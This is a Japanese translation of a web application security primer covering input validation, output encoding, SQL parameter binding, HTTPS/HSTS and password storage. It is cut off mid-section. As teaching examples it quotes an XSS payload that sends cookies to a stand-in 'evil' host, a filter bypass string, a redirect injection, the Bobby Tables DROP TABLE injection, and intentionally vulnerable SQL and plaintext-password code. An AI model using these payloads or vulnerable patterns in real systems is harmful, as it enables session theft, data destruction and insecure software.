# The Basics of Web Application Security

## 要約

Web アプリケーションのセキュリティは、専門家だけに任せておける横断的関心事ではありません。この記事は、信頼境界、入力検証、HTML 出力エンコーディング、データベースクエリのパラメータバインディング、HTTPS、パスワード保存、認証、セッション管理、認可という、開発者が日々の実装で押さえるべき基本を整理しています。

中心にある考え方は、ブラウザから来るものを信用しないこと、データと実行可能コードを混ぜないこと、暗号やセッション管理を自作しないこと、権限は必ずサーバー側で検証することです。完璧な安全を約束する記事ではなく、よくある失敗を避け、フレームワークや成熟した仕組みを使いながらリスクを継続的に下げるための実践集として読むとよいでしょう。

## 読むときの観点

- セキュリティを「後でレビューするもの」ではなく、普段の設計・実装判断の一部として読む。
- 入力検証、出力エンコーディング、SQL バインディングが、それぞれ別の境界を守っている点に注目する。
- HTTPS、Cookie、セッション ID、パスワードハッシュのような基盤的な仕組みを、自作せず成熟した実装に寄せる理由を確認する。
- 認証、セッション管理、認可を混同せず、それぞれ独立した責務として捉える。
- RBAC や ABAC の説明では、権限モデルを将来の変化に耐えさせるために、ユーザー、ロール、権限をどう分離するかを見る。

## 原文の翻訳

現代のソフトウェア開発者は、万能ナイフのようでなければなりません。もちろん、顧客の機能要件を満たすコードを書く必要があります。そのコードは高速でなければなりません。さらに、理解しやすく拡張しやすいことも期待されます。IT への要求が進化する性質に耐えられるだけ柔軟でありながら、安定して信頼できる必要があります。使いやすいインターフェイスを整え、データベースを最適化し、しばしばデリバリーパイプラインを構築して保守することも求められます。しかも、それらを昨日までに終わらせなければならないのです。

要件一覧のずっと下、速いこと、安いこと、柔軟であることのさらに後ろに、「安全であること」が置かれがちです。何かがうまくいかなくなるまではそうです。作ったシステムが侵害されると、突然セキュリティは最重要であり、最初からずっと最重要だったことになります。

セキュリティは、パフォーマンスに少し似た横断的関心事です。そして、パフォーマンスとは少し違います。パフォーマンスと同じように、ビジネス側の人たちはセキュリティが必要だとはよく知っていますが、それをどう数量化すればよいかまでは分からないことが多いものです。パフォーマンスと違うのは、「十分に安全」な状態を見ても、それがそうだと分からないことが多い点です。

では、曖昧なセキュリティ要件と未知の脅威がある世界で、開発者はどう働けばよいのでしょうか。要件を定義し、脅威を特定するよう働きかけるのは価値ある活動です。しかし、それには時間がかかり、したがってお金もかかります。多くの場合、開発者は具体的なセキュリティ要件がないまま働きます。組織がセキュリティ上の関心を要件取り込みプロセスへどう組み込むかを模索している間にも、開発者はシステムを作り、コードを書き続けます。

この Evolving Publication では、次のことを扱います。

- Web アプリケーションで、開発者がセキュリティリスクを特に意識すべき一般的な領域を示す。
- 一般的な Web スタックで、それぞれのリスクにどう対処するかの指針を示す。
- 開発者が犯しがちな間違いと、それを避ける方法を強調する。

ブラウザベースの Web アプリケーションだけに範囲を絞っても、セキュリティは非常に大きな話題です。この記事群は、知るべきことを網羅したカタログというより「ベスト盤」に近いものになります。それでも、急いで立ち上がろうとしている開発者に、方向づけられた最初の一歩を提供できればと願っています。

### Trust

入力と出力の細かな話に入る前に、セキュリティの根底にある最も重要な原則のひとつ、信頼について触れておく価値があります。ユーザーのブラウザから来るリクエストの完全性を信頼できるでしょうか。答えは、信頼できません。上流サービスがデータをきれいで安全にする作業を済ませてくれたと信頼できるでしょうか。これも、できません。ユーザーのブラウザとアプリケーションの間の接続が改ざんされないと信頼できるでしょうか。完全にはできません。依存しているサービスやデータストアを信頼できるでしょうか。場合によっては、できるかもしれません。

もちろん、セキュリティと同じく、信頼も二値ではありません。リスク許容度、データの重要性、安心できるほどリスクを管理するためにどれだけ投資すべきかを評価する必要があります。規律ある方法でそれを行うには、本来は脅威モデリングやリスクモデリングのプロセスを通す必要がありますが、それは別の記事で扱うべき複雑な話題です。ここでは、システムに対する一連のリスクを特定し、特定した以上はそこから生じる脅威に対処しなければならない、と考えれば十分です。

### Reject Unexpected Form Input

HTML フォームは、入力を制御しているという錯覚を作り出します。フォームのマークアップを書く人は、ユーザーがフォームに入力できる値の種類を制限しているので、データもその制約に従うはずだと思うかもしれません。しかし安心しないでください。それは錯覚にすぎません。クライアントサイド JavaScript のフォーム検証でさえ、セキュリティの観点ではまったく価値がありません。

#### Untrusted Input

信頼度の尺度で見ると、ユーザーのブラウザから来るデータは、こちらがフォームを提供しているかどうか、接続が HTTPS で保護されているかどうかにかかわらず、実質的にゼロです。ユーザーは送信前にマークアップを簡単に変更できますし、`curl` のようなコマンドラインアプリケーションで想定外のデータを送れます。あるいは、完全に無害なユーザーが、悪意あるサイトから変更済みフォームを知らずに送信しているかもしれません。Same Origin Policy は、悪意あるサイトがあなたのフォーム処理エンドポイントへ送信することを防ぎません。入ってくるデータの完全性を確保するには、**検証をサーバー側で扱う**必要があります。

では、形式のおかしなデータがなぜセキュリティ上の問題になるのでしょうか。アプリケーションロジックや出力エンコーディングの使い方によっては、予期しない振る舞い、データ漏えい、さらには入力データの境界を破って実行可能コードへ入り込む手段を攻撃者に与える可能性があります。

たとえば、ユーザーが連絡方法を選ぶラジオボタン付きフォームがあるとします。フォーム処理コードは、その値によって異なる振る舞いをします。

```java
final String communicationType = req.getParameter("communicationType");
if ("email".equals(communicationType)) {
    sendByEmail();
} else if ("text".equals(communicationType)) {
    sendByText();
} else {
    sendError(resp, format("Can't send by type %s", communicationType));
}
```

このコードが危険かどうかは、`sendError` メソッドの実装次第です。下流のロジックが信頼できない内容を正しく処理してくれると信じているわけです。正しく処理するかもしれません。しかし、そうでないかもしれません。予期しない制御フローの可能性をそもそもなくせるなら、そのほうがずっとよいのです。

#### Input Validation

入力検証とは、入力データがアプリケーションの期待と一致していることを確認するプロセスです。期待される値の集合から外れたデータは、ビジネスロジックの違反、障害の誘発、さらには攻撃者によるリソースやアプリケーション自体の制御を引き起こすことがあります。サーバー上でデータベースクエリのような実行可能コードとして評価される入力や、クライアント上で HTML や JavaScript として実行される入力は特に危険です。入力検証は、このリスクから守るための重要な第一防衛線です。

開発者は、値が null でないことや整数が正であることを確認する程度の基本的な入力検証はよく実装します。攻撃リスクを下げる次の一歩は、入力を論理的に許容できる値だけへさらに制限することを考えることです。

入力検証は、小さな集合に制限できる入力ほど効果的です。数値型は通常、特定の範囲内の値に制限できます。たとえば、ユーザーが負の金額を送金しようとしたり、買い物かごに数千個の商品を入れたりするのは意味がありません。入力を既知の許容可能な型や値へ制限するこの戦略は、正の検証、またはホワイトリスト方式として知られています。ホワイトリストは、URL や `yyyy/mm/dd` 形式の日付のような特定の形の文字列に制限できます。入力長、単一の文字エンコーディング、あるいは先ほどの例ならフォームで利用可能な値だけに制限することもできます。

入力検証を、フォーム処理コードと利用者の間の契約を強制することだと考えることもできます。その契約に違反するものは無効であり、したがって拒否されます。契約が制限的であればあるほど、そしてそれが厳格に強制されるほど、予期しない条件から生まれるセキュリティ脆弱性にアプリケーションが陥る可能性は低くなります。

検証に失敗した入力をどう扱うかは、選択しなければなりません。最も制限的で、おそらく最も望ましい方法は、フィードバックなしに完全に拒否し、その事象がログや監視で記録されるようにすることです。なぜフィードバックなしなのでしょうか。データがなぜ無効なのかをユーザーへ知らせるべきではないのでしょうか。それは契約次第です。上のフォーム例で `email` や `text` 以外の値を受け取ったなら、何かおかしなことが起きています。バグがあるか、攻撃されているかのどちらかです。さらに、そのフィードバック機構そのものが攻撃点になるかもしれません。`sendError` が「communicationType では応答できません」のようなエラーメッセージとして値を画面へ書き戻すとします。`communicationType` が普通の文字列なら問題ありません。しかし、次のような値ならどうでしょうか。

```html
<script>new Image().src = 'http://evil.martinfowler.com/steal?' + document.cookie</script>
```

今度は、セッション Cookie を盗む反射型 XSS 攻撃の可能性に直面します。ユーザーへフィードバックを返す必要があるなら、「email または text を選択してください」のような定型応答にするのがよいでしょう。どうしてもユーザー入力を表示し直さざるを得ないなら、必ず適切にエンコードしてください。

#### In Practice

この攻撃を防ぐために `<script>` タグをフィルタしたくなるかもしれません。既知の危険な値を含む入力を拒否する戦略は、負の検証、またはブラックリスト方式と呼ばれます。この方法の問題は、悪い入力の可能性が非常に多いことです。潜在的に危険な入力の完全なリストを維持するのは高コストで時間もかかりますし、継続的な保守も必要です。それでも、自由形式の入力など、それしか選べない場合もあります。ブラックリストを使わなければならないなら、すべてのケースを慎重に覆い、良いテストを書き、できるだけ制限的にし、攻撃者が防御を回避する一般的な方法を学ぶために OWASP の XSS Filter Evasion Cheat Sheet を参照してください。

無効な入力を「取り除く」誘惑にも抵抗してください。これは一般にサニタイズと呼ばれます。本質的には、望ましくない入力を拒否するのではなく削除するブラックリストです。他のブラックリストと同じく、正しく行うのは難しく、攻撃者に回避の機会を増やします。先ほどの例で `<script>` タグを取り除くことにした場合、攻撃者は次のような単純な入力で回避できるかもしれません。

```html
<scr<script>ipt>
```

ブラックリストは攻撃を捉えたのに、それを「直す」ことで脆弱性を再導入してしまいます。

入力検証機能は、現代的なフレームワークの多くに組み込まれています。ない場合でも、フィールドごとに複数の制約をルールとして適用できる外部ライブラリがあります。メールアドレスやクレジットカード番号のような一般的パターンの組み込み検証は便利なおまけです。Web フレームワークの検証を使うと、検証ロジックを Web 層の最も外側へ押し出せます。その結果、無効なデータは、重大な間違いを起こしやすい複雑なアプリケーションコードへ到達する前に拒否されます。

#### In Summary

- できるときはホワイトリストを使う。
- ホワイトリストにできないときだけブラックリストを使う。
- 契約はできるだけ制限的に保つ。
- 攻撃の可能性を確実に通知・記録する。
- 入力をユーザーへ反射して返すことを避ける。
- 信頼できないデータの扱いを誤る経路を減らすため、Web の内容はアプリケーションロジックの奥へ入る前に拒否する。さらによいのは、Web フレームワークで入力をホワイトリスト化すること。

この節では、フォーム処理コードを守る仕組みとして入力検証に焦点を当てました。しかし、信頼できないソースからの入力を扱うコードなら、メッセージが JSON、XML、その他の形式であっても、Cookie、ヘッダー、URL パラメータ文字列であっても、ほぼ同じ方法で検証できます。覚えておいてください。**自分が制御していないものは信頼できません**。契約に違反するなら拒否するのです。

### Encode HTML Output

アプリケーションへ入ってくるデータを制限することに加えて、Web アプリケーション開発者は、出ていくデータにも細心の注意を払う必要があります。現代の Web アプリケーションは通常、文書構造のための基本的な HTML マークアップ、文書スタイルのための CSS、アプリケーションロジックのための JavaScript、そしてそのどれにもなり得るユーザー生成コンテンツを持っています。すべてはテキストであり、多くの場合、同じ文書へ描画されます。

HTML 文書は、`<script>` や `<style>` のようなタグで分けられた、入れ子になった実行コンテキストの集まりです。開発者は、たったひとつの余計な山括弧で、意図したものとはまったく違う実行コンテキストへ入ってしまいます。さらに、実行コンテキストの中に文脈固有の内容が埋め込まれていると複雑さは増します。たとえば HTML も JavaScript も URL を含められますが、それぞれ独自の規則を持っています。

#### Output Risks

HTML は非常に寛容な形式です。ブラウザは、内容が壊れていてもできるだけ描画しようとします。悪い括弧ひとつで単にエラーにならないのは開発者にとってありがたく見えるかもしれません。しかし、壊れたマークアップを描画しようとすることは、脆弱性の大きな源です。攻撃者は、ページが妥当かどうかを気にせず、実行コンテキストを破る内容をページへ注入できます。

出力を正しく扱うことは、厳密にはセキュリティだけの問題ではありません。データベースや上流サービスのようなソースからのデータを描画するアプリケーションは、その内容がアプリケーションを壊さないようにする必要があります。ただし、信頼できないソースからの内容を描画するとき、リスクは特に高くなります。前の節で述べたように、開発者は契約の範囲外にある入力を拒否すべきです。しかし、単一引用符や開き山括弧のように、コードを変えてしまう可能性のある文字を含む入力を受け入れる必要があるときはどうすればよいのでしょうか。ここで出力エンコーディングが登場します。

#### Output Encoding

出力エンコーディングとは、出ていくデータを最終的な出力形式へ変換することです。難しいのは、そのデータがどのように消費されるかによって、必要なコーデックが異なることです。適切な出力エンコーディングがなければ、アプリケーションはクライアントに壊れたデータを渡して使えなくしてしまうか、さらに悪ければ危険にしてしまいます。不十分または不適切なエンコーディングを見つけた攻撃者は、開発者の意図した出力構造を根本的に変えられる潜在的な脆弱性があると知ります。

たとえば、あるシステムの最初の顧客のひとりが元最高裁判事 Sandra Day O'Connor だったとします。彼女の名前を HTML へ描画するとどうなるでしょうか。

```html
<p>The Honorable Justice Sandra Day O'Connor</p>
```

これは次のように描画されます。

```text
The Honorable Justice Sandra Day O'Connor
```

世界は平和です。ページは期待どおり生成されます。しかし、このページはモデル・ビュー・コントローラ構成の凝った動的 UI かもしれません。この文字列は JavaScript にも現れます。ページが次をブラウザへ出力するとどうなるでしょうか。

```javascript
document.getElementById('name').innerText = 'Sandra Day O'Connor' //<--unescaped string
```

結果は壊れた JavaScript です。攻撃者は、こうした場所を探して実行コンテキストを破り、無害なデータを危険な実行可能コードへ変えます。もし「判事」が名前として次を入力したなら、

```text
Sandra Day O';window.location='http://evil.martinfowler.com/';
```

ユーザーは突然、敵対的なサイトへ飛ばされます。一方、JavaScript コンテキスト向けに正しく出力をエンコードしていれば、テキストは次のようになります。

```javascript
'Sandra Day O\';window.location=\'http://evil.martinfowler.com/\';'
```

少し分かりにくいかもしれませんが、これは完全に無害な、実行されない文字列です。JavaScript のエンコードにはいくつかの戦略があります。この例ではアポストロフィをエスケープシーケンスで表していますが、Unicode エスケープシーケンスでも安全に表せます。

良い知らせは、現代的な Web フレームワークの多くが、内容を安全に描画し、予約文字をエスケープする仕組みを持っていることです。悪い知らせは、そうしたフレームワークの多くがこの保護を迂回する仕組みも持っており、開発者が無知から、あるいは安全だと信じている実行可能コードを描画するために、それを使ってしまうことです。

#### Cautions and Caveats

現在はツールやフレームワークが非常に多く、エンコーディングの文脈も HTML、XML、JavaScript、PDF、CSS、SQL など多岐にわたるため、包括的な一覧を作るのは現実的ではありません。別のフレームワークを使っているなら、安全な出力エンコーディング関数についてドキュメントを確認してください。フレームワークにそれがないなら、あるものへ変更することを検討してください。そうでなければ、出力エンコーディングコードを自分で作るという、うらやましくない仕事が待っています。

また、フレームワークが HTML を安全に描画するからといって、JavaScript や PDF も安全に描画するとは限りません。特定のエンコーディングツールがどの文脈向けに書かれているかを認識しておく必要があります。

警告しておきます。生のユーザー入力を受け取り、保存前にエンコードしたくなるかもしれません。このパターンはたいてい後で噛みついてきます。保存前に HTML としてエンコードすると、そのデータを別形式で描画する必要が出たときに問題になります。HTML のエンコードを解除し、新しい出力形式へ再エンコードしなければならないかもしれません。これは複雑さを大きく増やし、アプリケーションコード内で内容をアンエスケープするコードを書く誘惑を生みます。その結果、上流で苦労して行った出力エンコーディングが事実上役に立たなくなります。データはできるだけ生の形で保存し、描画時にエンコードするほうがずっとよいのです。

最後に、入れ子になった描画コンテキストは非常に複雑なので、可能な限り避けるべきです。単一の出力文字列を正しく扱うだけでも難しいのに、JavaScript の中の HTML の中の URL を描画するなら、ひとつの文字列について三つのコンテキストを心配しなければなりません。どうしても入れ子を避けられないなら、問題を別々の段階へ分解し、それぞれを十分にテストし、描画順序に特に注意してください。

#### In Summary

- すべてのアプリケーションデータを、出力時に適切なコーデックでエンコードする。
- 利用可能なら、フレームワークの出力エンコーディング機能を使う。
- 入れ子になった描画コンテキストはできるだけ避ける。
- データは生の形で保存し、描画時にエンコードする。
- エンコーディングを避ける危険なフレームワーク呼び出しや JavaScript 呼び出しを避ける。

### Bind Parameters for Database Queries

リレーショナルデータベースに SQL を書いている場合でも、オブジェクトリレーショナルマッピングフレームワークを使っている場合でも、NoSQL データベースへ問い合わせている場合でも、入力データがクエリの中でどう使われるかを気にする必要があります。

データベースは、Web アプリケーションの中で最も重要な部分であることがよくあります。簡単には復元できない状態を含んでいるからです。保護すべき重要で機密性の高い顧客情報を含むこともあります。アプリケーションを動かし、ビジネスを動かすデータです。だからこそ、開発者はデータベースとやり取りするときに最も注意するはずです。それにもかかわらず、データベース層へのインジェクションは、防ぐのが比較的簡単であるにもかかわらず、現代の Web アプリケーションを悩ませ続けています。

#### Little Bobby Tables

パラメータバインディングを語るなら、有名な 2007 年の xkcd「Little Bobby Tables」を抜きにはできません。この漫画を分解して考えるために、成績を管理するシステムに新しい生徒を追加する関数があるとします。

```java
void addStudent(String lastName, String firstName) {
        String query = "INSERT INTO students (last_name, first_name) VALUES ('"
                + lastName + "', '" + firstName + "')";
        getConnection().createStatement().execute(query);
}
```

`addStudent` が `"Fowler"` と `"Martin"` で呼ばれれば、結果の SQL は次のようになります。

```sql
INSERT INTO students (last_name, first_name) VALUES ('Fowler', 'Martin')
```

しかし Little Bobby の名前では、次の SQL が実行されます。

```sql
INSERT INTO students (last_name, first_name) VALUES ('XKCD', 'Robert'); DROP TABLE Students;-- ')
```

実際には二つのコマンドが実行されます。

```sql
INSERT INTO students (last_name, first_name) VALUES ('XKCD', 'Robert')

DROP TABLE Students
```

最後の `--` は元のクエリの残りをコメントアウトし、SQL 構文が妥当になるようにします。こうして `DROP` が実行されます。この攻撃ベクトルでは、ユーザーがアプリケーションのデータベースユーザーの文脈で任意の SQL を実行できます。言い換えれば、攻撃者はアプリケーションにできることは何でも、場合によってはそれ以上のことができます。データ整合性の破壊、機密情報の露出、実行可能コードの挿入など、`DROP` より大きな被害を生む攻撃もあり得ます。

#### Parameter Binding to the Rescue

漫画に出てくる「サニタイズ」という解決策に異議を唱えるなら、サニタイズを正しく行うのは非常に難しく、新たな攻撃ベクトルを生み、確かに正しい方法ではありません。最良で、おそらく唯一まともな選択肢はパラメータバインディングです。たとえば JDBC は、この目的のために `PreparedStatement.setXXX()` メソッドを提供しています。パラメータバインディングは、SQL のような実行可能コードと内容を分離し、内容のエンコーディングやエスケープを透過的に処理する手段を提供します。

```java
void addStudent(String lastName, String firstName) {
        PreparedStatement stmt = getConnection().prepareStatement("INSERT INTO students (last_name, first_name) VALUES (?, ?)");
        stmt.setString(1, lastName);
        stmt.setString(2, firstName);
        stmt.execute();
}
```

十分な機能を持つデータアクセス層なら、変数をバインドし、実装を下位プロトコルへ委ねる機能を持っています。これにより、開発者はユーザー入力と実行可能コードを混ぜることで生じる複雑さを理解しなくてもよくなります。効果を持たせるには、すべての信頼できない入力をバインドする必要があります。連結、補間、フォーマットメソッドで SQL を組み立てるなら、結果文字列のどの部分もユーザー入力から作ってはいけません。

#### Clean and Safe Code

優れたセキュリティときれいなコードの間に緊張がある状況に出会うことがあります。セキュリティのために、アプリケーションを守る複雑さをプログラマが追加しなければならないこともあります。しかしこの場合は幸運にも、良いセキュリティと良い設計が一致しています。バインドパラメータを導入すると、インジェクションからアプリケーションを守るだけでなく、コードと内容の境界を明確にして理解しやすくし、引用符を手で管理する必要をなくして妥当な SQL を作りやすくします。

文字列フォーマットや連結をパラメータバインディングに置き換えるとき、汎用的なバインディング関数を導入する機会も見つかるかもしれません。これにより、コードのきれいさとセキュリティはさらに高まります。重複排除はテストしやすさを増し、複雑さを減らすという点で、良い設計と良いセキュリティが重なる場所でもあります。

#### Common Misconceptions

ストアドプロシージャが SQL インジェクションを防ぐという誤解があります。しかし、それが真であるのは、ストアドプロシージャ内部でパラメータがバインドされている場合に限ります。ストアドプロシージャ自体が文字列連結をしているなら、そこも注入可能になり得ます。クライアントから変数をバインドしても救われません。

同様に、ActiveRecord、Hibernate、.NET Entity Framework のような ORM も、バインディング関数を使っていない限り守ってはくれません。信頼できない入力をバインドせずにクエリを組み立てているなら、アプリケーションは依然としてインジェクション攻撃に脆弱です。

NoSQL データベースはインジェクション攻撃を受けないという誤解もありますが、それも正しくありません。SQL であれそれ以外であれ、すべてのクエリ言語では、実行がコマンドとパラメータを混同しないよう、実行可能コードと内容の明確な分離が必要です。攻撃者は、実行時にその境界を破り、入力データで意図された実行経路を変えられる場所を探します。結論として、利用しているデータストアとドライバのドキュメントを確認し、入力データを安全に扱う方法を使う必要があります。

#### In Summary

- ユーザー入力から SQL、または NoSQL 相当のクエリを組み立てない。
- クエリでもストアドプロシージャでも、すべてのパラメータ化データをバインドする。
- エンコーディングを自分で扱おうとせず、ネイティブドライバのバインディング関数を使う。
- ストアドプロシージャや ORM ツールが救ってくれると思わない。それらでもバインディング関数を使う必要がある。
- NoSQL だからインジェクションに無敵になるわけではない。

### Protect Data in Transit

入力と出力の話をしているところで、もうひとつ重要な考慮事項があります。転送中データのプライバシーと完全性です。通常の HTTP 接続を使うと、データが平文で送られるため、ユーザーは多くのリスクにさらされます。ユーザーのブラウザとサーバーの間のどこかでネットワークトラフィックを傍受できる攻撃者は、中間者攻撃によって、まったく検知されずにデータを盗聴したり改ざんしたりできます。ユーザーのセッションや個人情報を盗む、Web サイトの文脈でブラウザに実行される悪意あるコードを注入する、ユーザーがサーバーへ送るデータを変更するなど、攻撃者にできることには限りがありません。

私たちは通常、ユーザーがどのネットワークを選ぶかを制御できません。カフェや飛行機内のオープンな無線ネットワークのように、誰でも簡単に通信を見られるネットワークを使っているかもしれません。公共の場所で攻撃者が設置した「Free Wi-Fi」のような名前の敵対的な無線ネットワークへ、知らずにつないでいるかもしれません。広告などの内容を Web トラフィックへ注入するインターネットプロバイダーを使っているかもしれませんし、政府が市民を日常的に監視する国にいるかもしれません。

攻撃者がユーザーを盗聴したり Web トラフィックを改ざんしたりできるなら、すべてが崩れます。交換されるデータは、どちらの側からも信頼できません。幸い、HTTPS を使えばこれらのリスクの多くから守れます。

#### HTTPS and Transport Layer Security

HTTPS はもともと金融取引のような機密性の高い Web トラフィックを守るために主に使われていました。しかし今では、ソーシャルネットワークや検索エンジンのような日常的に使う多くのサイトで、既定で使われるのが一般的になっています。HTTPS プロトコルは、SSL の後継である TLS を使って通信を保護します。正しく設定され使われているなら、盗聴と改ざんから守り、Web サイトが意図した相手であることを合理的に保証します。より技術的に言えば、機密性、データ完全性、そして Web サイトの同一性の認証を提供します。

私たちが直面する多くのリスクを考えると、すべてのネットワークトラフィックを機密性のあるものとして扱い、暗号化することはますます理にかなっています。Web トラフィックでは、これは HTTPS によって行われます。複数のブラウザベンダーは、安全でない HTTP を非推奨にし、HTTPS を使っていないサイトではユーザーに警告を表示する意向を示しています。ブラウザにおける HTTP/2 実装の多くは、TLS 上の通信だけをサポートします。では、なぜ今すぐすべてに使っていないのでしょうか。

HTTPS の採用を妨げる障害はいくつかありました。長い間、すべてのトラフィックへ使うには計算コストが高すぎると考えられていましたが、現代のハードウェアではかなり前からそうではありません。SSL と初期の TLS は、IP アドレスごとにひとつの Web サイト証明書しか使えない制限がありましたが、TLS に SNI という拡張が導入され、その制限は外れました。SNI は現在ほとんどのブラウザでサポートされています。認証局から証明書を取得する費用も採用の妨げでしたが、Let's Encrypt のような無料サービスの登場で、その障壁もなくなりました。今日では、かつてないほど障害は少なくなっています。

#### Get a Server Certificate

Web サイトの同一性を認証できることは、TLS の安全性の土台です。サイトが名乗る相手であることを検証できなければ、中間者攻撃ができる攻撃者はそのサイトになりすまし、プロトコルが提供する他の保護を損なえます。

TLS を使うとき、サイトは公開鍵証明書で自分の同一性を証明します。この証明書にはサイトに関する情報と公開鍵が含まれます。サイトは、対応する秘密鍵を知っていることで、その証明書の所有者であることを証明します。一部のシステムではクライアントにも証明書で同一性を証明させる場合がありますが、クライアント証明書の管理は複雑なため、現在の実務では比較的まれです。

サイトの証明書が事前に知られていない限り、クライアントにはその証明書を信頼できるか検証する方法が必要です。これは信頼モデルに基づいて行われます。Web ブラウザや多くのアプリケーションでは、Certificate Authority、つまり CA と呼ばれる信頼された第三者が、サイトや場合によっては所有組織の同一性を確認し、署名済み証明書を発行します。

証明書が別の経路で共有され事前に知られているなら、必ずしも信頼された第三者を巻き込む必要はありません。たとえばモバイルアプリや別のアプリケーションは、サイトの同一性を検証するための証明書やカスタム CA 情報を同梱して配布されることがあります。この実践は証明書ピンニングまたは公開鍵ピンニングと呼ばれますが、この記事の範囲外です。

多くのブラウザが表示する最も目に見える安全性の指標は、HTTPS によってサイトとの通信が保護され、証明書が信頼されているときのものです。それがなければ、ブラウザは証明書に関する警告を表示し、ユーザーがサイトを見るのを防ぎます。そのため、信頼された CA から証明書を取得することが重要です。

#### Configure Your Server

証明書を手に入れたら、HTTPS をサポートするようサーバーを設定できます。一見すると、暗号学の博士号を持つ人にふさわしい作業に見えるかもしれません。広い範囲のブラウザバージョンをサポートする設定を選びたい一方で、高い安全性と一定のパフォーマンスを維持することとのバランスも取る必要があります。

サイトがサポートする暗号アルゴリズムとプロトコルバージョンは、提供される通信セキュリティの水準に強く影響します。FREAK、DROWN、POODLE のような印象的な名前の攻撃は、古いプロトコルバージョンやアルゴリズムをサポートすると、ブラウザがサーバーのサポートする最も弱い選択肢へ誘導され、攻撃が容易になるリスクがあることを示しました。計算能力の向上とアルゴリズムの数学的基盤への理解の進展によって、アルゴリズムは時間とともに安全性を失うこともあります。

幸い、選択をずっと簡単にしてくれるツールがあります。Mozilla は、さまざまな Web サーバー向けの推奨設定を生成する SSL Configuration Generator と、より詳しい Server Side TLS Guide を提供しています。なお、この設定ジェネレータは HSTS というブラウザのセキュリティ機能を既定で有効にします。長期的にすべての通信で HTTPS を使う覚悟ができるまでは問題になる可能性があるため、HSTS については少し後で説明します。

#### Use HTTPS for Everything

提供するリソースの一部だけを HTTPS で守る Web サイトに出会うことは珍しくありません。機密性が高いと考えられるフォーム送信だけを保護する場合もありますし、ログイン後にアクセスする内容のような機密リソースだけに使う場合もあります。

この一貫しない方法の問題は、HTTPS で提供されていないものはすべて、先に述べたリスクにさらされ続けることです。たとえば中間者攻撃を行う攻撃者は、フォームを単に改ざんし、機密データを平文 HTTP で送信させられます。攻撃者がこちらのサイトの文脈で実行されるコードを注入したなら、一部が HTTPS で守られていてもあまり意味はありません。これらのリスクを防ぐ唯一の方法は、**すべてに HTTPS を使う**ことです。

ただし、すべてのリソースを HTTPS で提供するのは、スイッチを切り替えるほど単純ではありません。ユーザーがアドレスバーに `https://` を明示せずアドレスを入力すると、ブラウザは既定で HTTP を使います。そのため、HTTP のネットワークポートを単に閉じることはめったに選べません。Web サイトは慣例として、HTTP で受けたリクエストを HTTPS へリダイレクトします。理想的ではないかもしれませんが、多くの場合、利用可能な最善策です。

API も HTTP で提供しているなら、HTTPS への移行にはより慎重な手順が必要になることがあります。すべての API クライアントがリダイレクトを扱えるわけではありません。この場合、API 利用者と協力して HTTPS へ切り替え、終了日を計画し、その日以降は HTTP リクエストにエラーを返し始めるのがよいでしょう。

#### Use HSTS

HTTP から HTTPS へユーザーをリダイレクトする処理は、通常の HTTP で送られる他のリクエストと同じリスクを持ちます。この課題に対処するため、現代のブラウザは HSTS、HTTP Strict Transport Security という強力なセキュリティ機能をサポートしています。これは、ブラウザに対して、その Web サイトとは HTTPS でだけやり取りするよう要求できる機能です。

```text
Strict-Transport-Security: max-age=15768000
```

このヘッダーは、ブラウザに対して 6 か月間、そのサイトと HTTPS だけでやり取りするよう指示します。HSTS は、厳格なポリシーを強制するため、有効にすべき重要な機能です。一度有効になると、ブラウザは安全でない HTTP リクエストを自動的に HTTPS へ変換します。ユーザーが明示的に `http://` と入力しても同じです。また、無効な証明書に遭遇したときに表示される警告を、ユーザーが迂回することも許さないよう指示します。

HSTS を有効にする前には、いくつかの課題を考慮する必要があります。多くのブラウザは、HTTPS リソースから参照される HTTP コンテンツの読み込みを拒否します。そのため、既存のリソースを更新し、すべてが HTTPS でアクセスできることを確認することが重要です。外部システムからコンテンツがどう読み込まれるかを常に制御できるわけではありません。広告ネットワークなどでは、外部システムの所有者と協力して HTTPS を採用してもらうか、外部システムが更新されるまで HTTPS 経由で外部コンテンツを配信するプロキシを一時的に用意する必要があるかもしれません。

HSTS は、一度有効にするとヘッダーで指定した期間が経過するまで無効にできません。サイトに対して有効にする前に、すべてのコンテンツで HTTPS が機能していることを確認するのが賢明です。HSTS Preload List からドメインを削除するにはさらに時間がかかります。Preload List に追加する判断は、軽く行うべきではありません。

#### Protect Cookies

ブラウザには、機密情報を含む Cookie の漏えいを避けるための組み込みセキュリティ機能があります。Cookie に `secure` フラグを設定すると、HTTPS を使っているときだけ Cookie を送るようブラウザへ指示できます。これは、HSTS が有効であっても利用すべき重要な保護です。

#### Other Risks

HTTPS を使っていても、機密情報の偶発的な漏えいにつながるリスクはいくつかあります。

機密データを URL に入れるのは危険です。URL がブラウザ履歴にキャッシュされる場合はもちろん、サーバー側のログに記録される場合にもリスクがあります。さらに、その URL のリソースが外部サイトへのリンクを含み、ユーザーがクリックした場合、機密データは `Referer` ヘッダーで漏えいします。

また、機密データはクライアントや中間プロキシにキャッシュされるかもしれません。通常のユーザーでは通信内容はプロキシに見えませんが、企業では独自 CA を従業員のシステムへインストールし、脅威対策やコンプライアンスのために通信を監視する実践がよく見られます。キャッシュによる漏えいリスクを減らすため、キャッシュを無効にするヘッダーの利用を検討してください。

#### Verify Your Configuration

最後のステップとして、設定を検証すべきです。これにも便利なオンラインツールがあります。SSL Labs の SSL Server Test を使えば、設定を深く分析し、誤設定がないことを確認できます。このツールは新しい攻撃の発見やプロトコル更新に合わせて更新されるため、数か月ごとに実行するのがよいでしょう。

#### In Summary

- すべてに HTTPS を使う。
- HSTS でそれを強制する。
- 通常の Web ブラウザから信頼される必要があるなら、信頼された認証局の証明書が必要になる。
- 秘密鍵を保護する。
- 安全な HTTPS 設定を採用するため、設定ツールを使う。
- Cookie に `secure` フラグを設定する。
- URL で機密データを漏らさないよう注意する。
- HTTPS 有効化後、そしてその後も数か月ごとにサーバー設定を検証する。

### Hash and Salt Your Users' Passwords

アプリケーションを開発するときは、自分たちの資産を攻撃者から守るだけでは足りません。多くの場合、ユーザーを攻撃者から、さらにはユーザー自身からも守る必要があります。

#### Living Dangerously

パスワード認証を書く最も分かりやすい方法は、ユーザー名とパスワードをテーブルに保存し、それに対して検索することです。絶対にこうしてはいけません。

```sql
-- SQL
CREATE TABLE application_user (
  email_address VARCHAR(100) NOT NULL PRIMARY KEY,
  password VARCHAR(100) NOT NULL
)
```

```python
def login(conn, email, password):
  result = conn.cursor().execute(
    "SELECT * FROM application_user WHERE email_address = ? AND password = ?",
    [email, password])
  return result.fetchone() is not None
```

